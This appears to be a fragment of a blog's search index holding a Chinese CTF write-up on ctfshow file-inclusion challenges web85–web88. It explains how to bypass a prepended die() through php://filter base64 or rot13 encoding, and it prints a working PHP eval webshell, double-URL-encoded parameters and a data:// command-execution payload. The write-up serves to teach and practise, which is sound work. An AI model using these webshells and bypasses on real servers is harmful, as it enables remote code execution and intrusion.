+<li><code>$needle</code>：要查找的字符或子字符串。</li>
+<li><code>$offset</code>：可选参数，表示从目标字符串的哪个位置开始查找。默认为 0，即从字符串的开头开始查找。</li>
+</ul>
+<p>好像对题目并没有什么影响，那就继续用</p>
+<h2 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h2><p>没什么区别，一样可以用脚本去做</p>
+<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730390601812-e5d1e52c-e755-433e-abac-2187befdff67.png" alt="img"></p>
+<p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p>
+<p>file_put_contents(urldecode($file), “&lt;?php die(‘大佬别秀了’);?&gt;”.$content);</p>
+<ul>
+<li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li>
+</ul>
+<p>那么 file_put_contents 函数，将会往 $file 里写入 &lt;?php die(‘大佬别秀了’);?&gt; 和我们 post 传入的 $content 内容。</p>
+<p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p>
+<p>由于这个die()函数的执行没有什么条件，所以还是不太好处理的，于是我就去翻阅了大量wp进行总结</p>
+<p>解题方法:</p>
+<h3 id="php-filter-流的-base64-decode-方法"><a href="#php-filter-流的-base64-decode-方法" class="headerlink" title="php:&#x2F;&#x2F;filter 流的 base64-decode 方法"></a>php:&#x2F;&#x2F;filter 流的 base64-decode 方法</h3><p>思路:</p>
+<p>Base64 编码仅包含 64 个可打印字符，即 A-Z、a-z、0-9、+ 和 &#x2F;。在 PHP 中，当使用 base64_decode 函数解码一个字符串时，如果字符串中包含不在 Base64 字符集中的字符，这些字符将被跳过，只解码合法的 Base64 字符。</p>
+<p>所以当题目中 $content 被加上了 &lt;?php die(‘大佬别秀了’);?&gt; ，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 先对其进行解码，在解码过程中，字符 &lt;、?、空格、(、’、)、;、&gt;，这些字符不符合 base64 编码的字符范围都将先被移除，最终剩下的用于解码的字符只有 phpdie 和我们 post 传入的内容。由于 Base64 解码是以 4 个字符为一组进行的，这里移除后只剩下 6 个字符，因此我们随便加两个合法字符补全，让其 base64 解码成功，后面再继续传入经过 base64 编码的 payload，也可以被正常解码。</p>
+<p>了解完原理就开始做题吧。</p>
+<p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p>
+<p>content是写入内容,要进行base64编码 对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组）） }else{     highlight_file(<strong>FILE</strong>); }</p>
+<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>进行二次编码后得到:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<p>对 webshell 进行 base64 编码：</p>
+<p>webshell：&lt;?php @eval($_GET[‘cmd’]);?&gt;</p>
+<p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p>
+<p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p>
+<p>post 传入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>用hackbar传参</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730392984123-c15ea09a-64a0-487a-90d6-0e1a026c17fd.png" alt="img"></p>
+<p>然后调用shell.php，传入cmd</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730393020737-c16d92aa-9fb3-4d03-9965-50bc47f3cf8a.png" alt="img"></p>
+<p>最后拿flag就行了</p>
+<h3 id="通过-rot13-编码实现绕过"><a href="#通过-rot13-编码实现绕过" class="headerlink" title="通过 rot13 编码实现绕过"></a>通过 rot13 编码实现绕过</h3><p>&lt;?php die(‘大佬别秀了’);?&gt; 经过 rot13 编码会变成 &lt;?cuc qrv(); ?&gt;，如果 php 未开启短标签，则不会认识这段代码，也就不会执行。</p>
+<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;sh.php</p>
+<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;sh.php</p>
+<p>两次 url 编码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
+
+<p>将一句话木马进行 rot13 解码后传入 </p>
+<p>content&#x3D;&lt;?cuc @riny($_TRG[‘pzq’]);?&gt;</p>
+<p>方法是一样的，主要是编码方式不一样，最终还是依靠编码去使die()函数exit掉</p>
+<p><strong>但这道题主要是前面短标签的 php 代码 &lt;?cuc qvr(‘大佬别秀了’);?&gt; 无法被识别，但是后面的 &lt;?php @eval($_GET[‘cmd’]);?&gt; 可以正常执行，总的来说这种方法适用于未开启短标签的情况。</strong></p>
+<h3 id="通过-strip-tags-函数去除-XML-标签"><a href="#通过-strip-tags-函数去除-XML-标签" class="headerlink" title="通过 strip_tags 函数去除 XML 标签"></a>通过 strip_tags 函数去除 <a href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a> 标签</h3><p>&lt;?php die(); ?&gt; 实际上就是一个 XML 标签，我们可以通过 strip_tags 函数去除它。</p>
+<h4 id="strip-tags函数"><a href="#strip-tags函数" class="headerlink" title="strip_tags函数"></a>strip_tags函数</h4><p>是一个在PHP中非常有用的内置函数，其主要功能是去除字符串中的HTML和PHP标签，确保输出到浏览器的内容是安全的</p>
+<p>strip_tags()函数用于剥去字符串中的HTML、XML以及PHP的标签。它接受一个字符串作为输入，并返回该字符串的一个版本，其中所有的HTML和PHP标签（除非在可选参数中指定了允许保留的标签）都被移除。</p>
+<p>具体用法:</p>
+<p>strip_tags(string $str [, string $allowable_tags &#x3D; null ]): string</p>
+<p>但是我们传入的一句话木马也是 XML 标签，如何让它只去除 &lt;?php die(); ?&gt; 而不破坏我们传入的木马呢？我们可以先对一句话木马进行 base64 编码后传入，这样就不会受到 strip_tags 函数的影响，当去除掉 &lt;?php die(); ?&gt; 后，由于 php:&#x2F;&#x2F;filter 允许使用多个过滤器，我们再调用 base64-decode 将一句话木马进行 base64 解码，实现还原。</p>
+<p>这个做法没试过，你们可以试一下</p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>很经典的一道文件包含题哈</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394008762-1f4d5086-c564-4870-bd5c-4a07dfd049ad.png" alt="img"></p>
+<p>这里过滤了php,~,!,@,#,$,%,^,&amp;,*,(,),-,+,&#x3D;,.键盘顶上的符号全部被过滤了</p>
+<p>然后我用了日志注入，php:&#x2F;&#x2F;filter伪协议和php:&#x2F;&#x2F;input伪协议发现都不能很好的绕过这些验证，这时候我们先找找哪些字符是可用的，从这些字符里面寻找做题思路</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394986525-f1c33433-17cf-46fd-b824-e04ae1a7c1ed.png" alt="img"></p>
+<p>利用data伪协议，同时进行base64加密，由于过滤了&#x3D;，所以可以在构造的 命令中添加上空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgICAgIHN5c3RlbSgndGFjIGZsMGcucGhwJyk7</span><br></pre></td></tr></table></figure>
+
+<p>主要是data协议构造base64的时候必须要求不含&#x3D;和+号，多试几次构造一下，在结尾?&gt;后添加字符消除&#x3D;</p>
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
       </tags>
   </entry>
 </search>
